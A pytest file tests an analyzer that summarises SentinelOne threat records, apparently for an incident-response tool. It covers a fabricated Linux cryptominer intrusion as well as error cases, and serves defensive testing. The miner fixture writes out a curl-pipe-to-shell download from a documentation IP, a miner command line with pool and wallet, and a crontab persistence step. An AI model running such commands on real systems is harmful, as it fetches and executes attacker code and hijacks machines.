"""Fabricated end-to-end scenarios for S1ThreatContext.

The fixtures are made up but shaped like real v2.1 responses: nulls and empty
strings where S1 sends them, events out of order, unrequested event types,
missing agent blocks. Hostnames use example.test and IPs use the RFC 5737
documentation ranges.
"""

import pytest

NS = "S1ThreatContext"
API = "https://console.example.test/web/api/v2.1"


def urls(threat_id):
    return f"{API}/threats", f"{API}/threats/{threat_id}/explore/events"


def tax(level, predicate, value):
    return {"level": level, "namespace": NS, "predicate": predicate, "value": value}


def test_linux_miner_storyline_across_two_pages(run_analyzer, mocked_api, load_fixture):
    threat_id = "1800000000000000001"
    threats_url, events_url = urls(threat_id)
    mocked_api.get(threats_url, json=load_fixture("linux_miner_threat.json"))
    mocked_api.get(events_url, json=load_fixture("linux_miner_events_p1.json"))
    mocked_api.get(events_url, json=load_fixture("linux_miner_events_p2.json"))

    output = run_analyzer(threat_id)

    assert output["success"] is True
    assert output["summary"]["taxonomies"] == [
        tax("info", "Found", "True"),
        tax("suspicious", "Confidence", "suspicious"),
        tax("info", "Verdict", "true_positive"),
        tax("info", "Mitigation", "not_mitigated"),
        tax("info", "Events", 11),  # 12 events fetched, the "logins" one is dropped
    ]
    full = output["full"]
    assert full["threat"] == {
        "id": threat_id,
        "name": "kworkerd",
        "classification": "Miner",
        "confidence": "suspicious",
        "analyst_verdict": "true_positive",
        "mitigation_status": "not_mitigated",
        "incident_status": "in_progress",
        "storyline": "5F00000000000001",
        "file_path": "/tmp/.X11-cache/kworkerd",
        "sha1": "3333333333333333333333333333333333333333",
        "originator_process": "bash",
        "command_line": "/tmp/.X11-cache/kworkerd -o pool.example.test:3333 -u wallet0 --donate-level 0",
        "process_user": "www-data",
        # No agentRealtimeInfo: os and site fall back to agentDetectionInfo, endpoint is left out.
        "os": "Ubuntu 22.04.4 LTS",
        "site": "Example Linux Site",
    }
    assert full["processes"] == [
        {"time": "2026-11-21T03:14:02.120Z", "name": "bash", "pid": "2211", "parent": "php-fpm8.1",
         "user": "www-data", "command_line": "bash -c curl -fsSL http://203.0.113.77/i.sh | sh",
         "sha1": "4444444444444444444444444444444444444444"},
        {"time": "2026-11-21T03:14:02.480Z", "name": "curl", "pid": "2212", "parent": "bash",
         "user": "www-data", "command_line": "curl -fsSL http://203.0.113.77/i.sh"},
        {"time": "2026-11-21T03:14:08.000Z", "name": "kworkerd", "pid": "2230", "parent": "sh",
         "user": "www-data",
         "command_line": "/tmp/.X11-cache/kworkerd -o pool.example.test:3333 -u wallet0 --donate-level 0"},
    ]
    assert full["network"] == [
        # No timestamp sorts first; inbound takes the remote side from src.
        {"process": "sshd", "direction": "INCOMING", "remote_ip": "198.51.100.200", "remote_port": 52000},
        {"time": "2026-11-21T03:14:02.600Z", "process": "curl", "direction": "OUTGOING",
         "remote_ip": "203.0.113.77", "remote_port": 80},
        {"time": "2026-11-21T03:14:10.000Z", "process": "kworkerd", "direction": "OUTGOING",
         "remote_ip": "198.51.100.33", "remote_port": 3333},
    ]
    assert full["dns"] == [
        {"time": "2026-11-21T03:14:09.000Z", "process": "kworkerd", "query": "pool.example.test"},
    ]
    assert full["files"] == [
        {"time": "2026-11-21T03:14:03.000Z", "process": "sh", "action": "create",
         "path": "/tmp/.X11-cache/kworkerd.part"},
        {"time": "2026-11-21T03:14:04.000Z", "process": "sh", "action": "rename",
         "path": "/tmp/.X11-cache/kworkerd"},
        {"time": "2026-11-21T03:14:05.000Z", "process": "sh", "action": "modify",
         "path": "/var/spool/cron/crontabs/www-data"},
        # Unknown file event types keep S1's name, lowercased.
        {"time": "2026-11-21T03:14:06.000Z", "process": "s1-agent", "action": "file scan",
         "path": "/tmp/.X11-cache/kworkerd"},
    ]
    assert full["registry"] == []
    assert full["truncated"] is False

    first, second = (c.request for c in mocked_api.calls[1:])
    assert "cursor" not in first.params
    assert second.params["cursor"] == "Y3Vyc29yLXBhZ2UtMg=="
    assert second.params["limit"] == "45"


def test_benign_admin_tool_with_sparse_fields_and_retired_events_endpoint(run_analyzer, mocked_api, load_fixture):
    threat_id = "1900000000000000002"
    threats_url, events_url = urls(threat_id)
    mocked_api.get(threats_url, json=load_fixture("benign_tool_threat.json"))
    mocked_api.get(events_url, status=410, json={"errors": [{"code": 4100010, "title": "Gone"}]})

    output = run_analyzer(threat_id)

    assert output["success"] is True
    assert output["summary"]["taxonomies"] == [
        tax("info", "Found", "True"),
        tax("info", "Confidence", "n/a"),
        tax("info", "Verdict", "false_positive"),
        tax("info", "Mitigation", "marked_as_benign"),
        tax("info", "Events", 0),
    ]
    # Nulls and empty strings are left out, not passed through.
    assert output["full"]["threat"] == {
        "id": threat_id,
        "name": "PsExec64.exe",
        "classification": "PUA",
        "confidence": "n/a",
        "analyst_verdict": "false_positive",
        "mitigation_status": "marked_as_benign",
        "incident_status": "resolved",
        "file_path": "C:\\Tools\\PsExec64.exe",
        "endpoint": "ADMIN-01",
        "os": "Windows Server 2022",
        "site": "Example Servers",
    }
    for key in ("processes", "network", "dns", "files", "registry"):
        assert output["full"][key] == []


def test_threat_without_status_fields_still_emits_found_and_events(run_analyzer, mocked_api):
    threat_id = "2000000000000000003"
    threats_url, events_url = urls(threat_id)
    mocked_api.get(threats_url, json={"data": [{"id": threat_id, "threatInfo": {}}]})
    mocked_api.get(events_url, json={"data": []})

    output = run_analyzer(threat_id)

    assert output["summary"]["taxonomies"] == [tax("info", "Found", "True"), tax("info", "Events", 0)]
    assert output["full"]["threat"] == {"id": threat_id}


def test_threats_endpoint_404_is_not_found(run_analyzer, mocked_api):
    threats_url, _ = urls("42")
    mocked_api.get(threats_url, status=404)

    output = run_analyzer("42")

    assert output["success"] is True
    assert output["summary"]["taxonomies"] == [tax("safe", "Found", "False")]


def test_surrounding_whitespace_in_id_is_ignored(run_analyzer, mocked_api):
    threats_url, _ = urls("42")
    mocked_api.get(threats_url, json={"data": []})

    output = run_analyzer("  42\n")

    assert output["success"] is True
    assert mocked_api.calls[0].request.params == {"ids": "42"}


def test_max_events_zero_skips_the_events_call(run_analyzer, mocked_api, load_fixture):
    threats_url, _ = urls("1234567890123456789")
    mocked_api.get(threats_url, json=load_fixture("threat.json"))

    output = run_analyzer("1234567890123456789", config={"max_events": 0})

    assert output["success"] is True
    assert len(mocked_api.calls) == 1
    assert output["summary"]["taxonomies"][-1] == tax("info", "Events", 0)


def test_forbidden_token_names_the_status(run_analyzer, mocked_api):
    threats_url, _ = urls("42")
    mocked_api.get(threats_url, status=403)

    output = run_analyzer("42")

    assert output["success"] is False
    assert "HTTP 403" in output["errorMessage"]
    assert "API token" in output["errorMessage"]


def test_non_json_response_fails_cleanly(run_analyzer, mocked_api):
    threats_url, _ = urls("42")
    mocked_api.get(threats_url, body="<html>maintenance</html>", content_type="text/html")

    output = run_analyzer("42")

    assert output["success"] is False
    assert "not JSON" in output["errorMessage"]


@pytest.mark.parametrize("status", [500, 503])
def test_events_server_error_fails_the_job(run_analyzer, mocked_api, load_fixture, status):
    # Only 404/410/empty are treated as "no events"; a server error is a real failure.
    threats_url, events_url = urls("1234567890123456789")
    mocked_api.get(threats_url, json=load_fixture("threat.json"))
    mocked_api.get(events_url, status=status, body="boom")

    output = run_analyzer("1234567890123456789")

    assert output["success"] is False
    assert f"HTTP {status}" in output["errorMessage"]
